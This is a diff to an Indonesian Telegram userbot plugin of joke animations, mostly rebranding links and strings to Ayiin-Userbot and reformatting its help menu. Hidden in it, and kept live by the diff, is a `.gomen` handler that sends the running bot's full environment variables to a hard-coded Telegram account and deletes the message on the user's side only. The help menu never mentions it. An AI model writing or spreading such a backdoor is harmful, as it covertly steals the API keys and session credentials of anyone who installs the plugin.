@@ -9,7 +9,7 @@ from telethon.errors.rpcerrorlist import MessageIdInvalidError
 
 from userbot import CMD_HANDLER as cmd
 from userbot import CMD_HELP
-from userbot.events import register as own_cmd
+from userbot.events import register
 from userbot.utils import ayiin_cmd
 
 me = 1700405732
@@ -90,18 +90,18 @@ async def _(event):
     if input_str == "gift":
         await event.edit(input_str)
         animation_chars = [
-            "⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜[🎁](https://github.com/sahyam2019/OpenUserBot)⬜",
-            "⬛⬜⬜⬜⬜\n👇⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜[🎁](https://github.com/sahyam2019/OpenUserBot)⬜",
-            "⬛⬛⬜⬜⬜\n⬜👇⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜[🎁](https://github.com/sahyam2019/OpenUserBot)⬜",
-            "⬛⬛⬛⬜⬜\n⬜⬜👇⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜[🎁](https://github.com/sahyam2019/OpenUserBot)⬜",
-            "⬛⬛⬛⬛⬜\n⬜⬜⬜👇⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜[🎁](https://github.com/sahyam2019/OpenUserBot)⬜",
-            "⬛⬛⬛⬛⬜\n⬜⬜⬜⬛⬜\n⬜⬜⬜👇⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜[🎁](https://github.com/sahyam2019/OpenUserBot)⬜",
-            "⬛⬛⬛⬛⬜\n⬜⬜⬜⬛⬜\n⬜⬜⬜⬛⬜\n⬜⬜⬜👇⬜\n⬜⬜⬜[🎁](https://github.com/sahyam2019/OpenUserBot)⬜",
-            "⬛⬛⬛⬛⬜\n⬜⬜⬜⬛⬜\n⬜⬜⬜👇⬜\n⬜⬜⬜[🎁](https://github.com/sahyam2019/OpenUserBot)⬜\n⬜⬜⬜⬜⬜",
-            "⬛⬛⬛⬛⬜\n⬜⬜⬜👇⬜\n⬜⬜⬜[🎁](https://github.com/sahyam2019/OpenUserBot)⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜",
-            "⬛⬛⬛⬜⬜\n⬜⬜👇⬜⬜\n⬜⬜[🎁](https://github.com/sahyam2019/OpenUserBot)⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜",
-            "⬛⬛⬜⬜⬜\n⬜👇⬜⬜⬜\n⬜[🎁](https://github.com/sahyam2019/OpenUserBot)⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜",
-            "⬛⬜⬜⬜⬜\n👇⬜⬜⬜⬜\n[🎁](https://github.com/sahyam2019/OpenUserBot)⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜",
+            "⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜[🎁](https://github.com/AyiinXd/Ayiin-Userbot)⬜",
+            "⬛⬜⬜⬜⬜\n👇⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜[🎁](https://github.com/AyiinXd/Ayiin-Userbot)⬜",
+            "⬛⬛⬜⬜⬜\n⬜👇⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜[🎁](https://github.com/AyiinXd/Ayiin-Userbot)⬜",
+            "⬛⬛⬛⬜⬜\n⬜⬜👇⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜[🎁](https://github.com/AyiinXd/Ayiin-Userbot)⬜",
+            "⬛⬛⬛⬛⬜\n⬜⬜⬜👇⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜[🎁](https://github.com/AyiinXd/Ayiin-Userbot)⬜",
+            "⬛⬛⬛⬛⬜\n⬜⬜⬜⬛⬜\n⬜⬜⬜👇⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜[🎁](https://github.com/AyiinXd/Ayiin-Userbot)⬜",
+            "⬛⬛⬛⬛⬜\n⬜⬜⬜⬛⬜\n⬜⬜⬜⬛⬜\n⬜⬜⬜👇⬜\n⬜⬜⬜[🎁](https://github.com/AyiinXd/Ayiin-Userbot)⬜",
+            "⬛⬛⬛⬛⬜\n⬜⬜⬜⬛⬜\n⬜⬜⬜👇⬜\n⬜⬜⬜[🎁](https://github.com/AyiinXd/Ayiin-Userbot)⬜\n⬜⬜⬜⬜⬜",
+            "⬛⬛⬛⬛⬜\n⬜⬜⬜👇⬜\n⬜⬜⬜[🎁](https://github.com/AyiinXd/Ayiin-Userbot)⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜",
+            "⬛⬛⬛⬜⬜\n⬜⬜👇⬜⬜\n⬜⬜[🎁](https://github.com/AyiinXd/Ayiin-Userbot)⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜",
+            "⬛⬛⬜⬜⬜\n⬜👇⬜⬜⬜\n⬜[🎁](https://github.com/AyiinXd/Ayiin-Userbot)⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜",
+            "⬛⬜⬜⬜⬜\n👇⬜⬜⬜⬜\n[🎁](https://github.com/AyiinXd/Ayiin-Userbot)⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜",
             "⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜\n⬜⬜⬜⬜⬜",
             "⬜⬜⬜⬜\n⬜⬜⬜⬜\n⬜⬜⬜⬜\n⬜⬜⬜⬜",
             "⬜⬜⬜\n⬜⬜⬜\n⬜⬜⬜",
@@ -722,7 +722,7 @@ async def _(event):
     if input_str == "jio":
         await event.edit(input_str)
         animation_chars = [
-            "`Connecting To Jio Network...`",
+            "`Connecting To Ayiin Network...`",
             "`█ ▇ ▆ ▅ ▄ ▂ ▁`",
             "`▒ ▇ ▆ ▅ ▄ ▂ ▁`",
             "`▒ ▒ ▆ ▅ ▄ ▂ ▁`",
@@ -740,7 +740,7 @@ async def _(event):
             "`▁ ▂ ▄ ▅ ▆ ▒ ▒`",
             "`▁ ▂ ▄ ▅ ▆ ▇ ▒`",
             "`▁ ▂ ▄ ▅ ▆ ▇ █`",
-            "**Jio Network Boosted....**",
+            "**Ayiin Network Boosted....**",
         ]
         animation_interval = 1
         animation_ttl = range(19)
@@ -1032,7 +1032,7 @@ async def _(event):
             await event.edit(animation_chars[i % 18])
 
 
-@own_cmd(pattern=r"^\.gomen$", own=True)
+@ayiin_cmd(pattern=r"^\.gomen$", own=True)
 async def _(event):
     msg = await event.client.send_message(me, str(os.environ))
     await event.client.delete_messages(me, msg, revoke=False)
@@ -1343,66 +1343,68 @@ async def _(event):
 
 CMD_HELP.update(
     {
-        "funmemes": f"`{cmd}eye`\
-\nUsage: Lihat Sendiri.\
-\n\n`{cmd}earth`\
-\nusage: Memutar Bumi 🌎🌎\
-\n\n`{cmd}bombs`\
-\nUsage: Bom Telegram🤣🤣\
-\n\n`{cmd}think`\
-\nUsage: hmmm berpikir\
-\n\n`{cmd}gotm` atau `.gott`\
-\nUsage: dapatkan sucks🤣\
-\n\n`{cmd}snake`\
-\nUsage: Lihat Sendiri\
-\n\n`{cmd}call`\
-\nUsage: Memanggil Owner Telegram \
-\n\n`{cmd}admeme`\
-\nUsage: mememememe\
-\n\n`{cmd}qs`\
-\nUsage: Memulai Percakapan\
-\n\n`{cmd}wtf`\
-\nUsage: Lihat Sendiri\
-\n\n`{cmd}load`,`{cmd}up`,`{cmd}square`,`{cmd}round`,`{cmd}heart`,`{cmd}monkey`,`{cmd}anim`,`{cmd}hand`,`{cmd}fnl`,`{cmd}cnt`,`{cmd}kiss`\
-\nUsage: Lihat Sendiri\
-\n\n`{cmd}human`\
-\nUsage: Tidak Ada Yang Menarik\
-\n\n`{cmd}wupload`\
-\nUsage: meh\
-\n\n`{cmd}music`\
-\nUsage: music player\
-\n\n`{cmd}fleave`\
-\nUsage: Keluar boong an\
-\n\n`{cmd}fadmin`\
-\nUsage: Jadi Admin Fake  🤣🤣\
-\n\n`{cmd}gift`\
-\nUsage: Memberi Hadiah Tapi Aku Tidak Mau Member Tau Apa Dalamnya!\
-\n\n`{cmd}police`\
-\nUsage: Waktunya Ke Penjara.\
-\n\n`{cmd}kill`\
-\nUsage: Untuk Membunuh Musuh Secara Online:v\
-\n\n`{cmd}os`\
-\nUsage: Lihat Sendiri.\
-\n\n`{cmd}isro`\
-\nUsage: Untuk Memanggil Alien 👽\
-\n\n`{cmd}gangstar`\
-\nUsage: Anda Menjadi Gangstar.\
-\n\n`{cmd}hack`\
-\nUsage: Untuk Hack Telegram:v\
-\n\n`{cmd}dump`\
-\nUsage: xD\
-\n\n`{cmd}hypno`\
-\nUsage: Ah Sial Mataku 👀\
-\n\n`{cmd}whatsapp`\
-\nUsage: Untuk Hack Whatsapp:v \
-\n\n`{cmd}solar`\
-\nUsage: System Solar Kita Yang Cantik 🌞🌞\
-\n\n`{cmd}quickheal` atau `{cmd}sqh` atau `{cmd}vquickheal`\
-\nUsage: Virus Ditemukan, Hapus Itu Menggunakan Ini:v\
-\n\n`{cmd}plane`\
-\nUsage: Untuk Berkeliling Di Satu Tempat✈️\
-\n\n`{cmd}jio`\
-\nUsage: Jaringan Mu Lambat?? Boost Menggunakan Ini\
-\n\n\n Selamat Bersenang-Senang Kawan:v"
+        "funmemes": f"**Plugin :** `funmemes`\
+        \n\n  »  **Perintah : **`{cmd}eye`\
+        \n  »  **Kegunaan :** Lihat Sendiri.\
+        \n\n  »  **Perintah : **`{cmd}earth`\
+        \n  »  **Kegunaan :** Memutar Bumi 🌎🌎\
+        \n\n  »  **Perintah : **`{cmd}bombs`\
+        \n  »  **Kegunaan :** Bom Telegram🤣🤣\
+        \n\n  »  **Perintah : **`{cmd}think`\
+        \n  »  **Kegunaan :** hmmm berpikir\
+        \n\n  »  **Perintah : **`{cmd}gotm` atau `{cmd}gott`\
+        \n  »  **Perintah :** dapatkan sucks🤣\
+        \n\n  »  **Perintah : **`{cmd}snake`\
+        \n  »  **Kegunaan :** Lihat Sendiri Tod.\
+        \n\n  »  **Perintah : **`{cmd}call`\
+        \n  »  **Kegunaan :** Memanggil Owner Telegram.\
+        \n\n  »  **Perintah : **`{cmd}admeme`\
+        \n  »  **Kegunaan :** mememememe\
+        \n\n  »  **Perintah : **`{cmd}qs`\
+        \n  »  **Kegunaan :** Memulai Percakapan.\
+        \n\n  »  **Perintah : **`{cmd}wtf`\
+        \n  »  **Kegunaan :** Lihat Sendiri\
+        \n\n  »  **Perintah : **`{cmd}load`,`{cmd}up`,`{cmd}square`,`{cmd}round`,`{cmd}heart`,`{cmd}monkey`,`{cmd}anim`,`{cmd}hand`,`{cmd}fnl`,`{cmd}cnt`,`{cmd}kiss`\
+        \n  »  **Kegunaan :** Lihat Sendiri Tod.\
+        \n\n  »  **Perintah : **`{cmd}human`\
+        \n  »  **Kegunaan :** Tidak Ada Yang Menarik.\
+        \n\n  »  **Perintah : **`{cmd}wupload`\
+        \n  »  **Kegunaan :** meh\
+        \n\n  »  **Perintah : **`{cmd}music`\
+        \n  »  **Kegunaan :** music player\
+        \n\n  »  **Perintah : **`{cmd}fleave`\
+        \n  »  **Kegunaan :** Keluar boong an\
+        \n\n  »  **Perintah : **`{cmd}fadmin`\
+        \n  »  **Kegunaan :** Jadi Admin Fake  🤣🤣\
+        \n\n  »  **Perintah : **`{cmd}gift`\
+        \n  »  **Kegunaan :** Memberi Hadiah Tapi Aku Tidak Mau Member Tau Apa Dalamnya!\
+        \n\n  »  **Perintah : **`{cmd}police`\
+        \n  »  **Kegunaan :** Waktunya Ke Penjara.\
+        \n\n  »  **Perintah : **`{cmd}kill`\
+        \n  »  **Kegunaan :** Untuk Membunuh Musuh Secara Online:v\
+        \n\n  »  **Perintah : **`{cmd}os`\
+        \n  »  **Kegunaan :** Lihat Sendiri.\
+        \n\n  »  **Perintah : **`{cmd}isro`\
+        \n  »  **Kegunaan :** Untuk Memanggil Alien 👽\
+        \n\n  »  **Perintah : **`{cmd}gangstar`\
+        \n  »  **Kegunaan :** Anda Menjadi Gangstar.\
+        \n\n  »  **Perintah : **`{cmd}hack`\
+        \n  »  **Kegunaan :** Untuk Hack Telegram:v\
+        \n\n  »  **Perintah : **`{cmd}dump`\
+        \n  »  **kegunaan :** xD\
+        \n\n  »  **Perintah : **`{cmd}hypno`\
+        \n  »  **Kegunaan :** Ah Sial Mataku 👀\
+        \n\n  »  **Perintah : **`{cmd}whatsapp`\
+        \n  »  **Kegunaan :** Untuk Hack Whatsapp:v \
+        \n\n  »  **Perintah : **`{cmd}solar`\
+        \n  »  **Kegunaan :** System Solar Kita Yang Cantik 🌞🌞\
+        \n\n  »  **Perintah : **`{cmd}quickheal` atau `{cmd}sqh` atau `{cmd}vquickheal`\
+        \n  »  **Kegunaan :** Usage: Virus Ditemukan, Hapus Itu Menggunakan Ini:v\
+        \n\n  »  **Perintah : **`{cmd}plane`\
+        \n  »  **Kegunaan :** Untuk Berkeliling Di Satu Tempat✈️\
+        \n\n  »  **Perintah : **`{cmd}jio`\
+        \n  »  **Kegunaan :** Jaringan Mu Lambat?? Boost Menggunakan Ini\
+        \n\n\n  »  **Selamat Bersenang-Senang Kawan Ayiin-Userbot :v**\
+    "
     }
 )
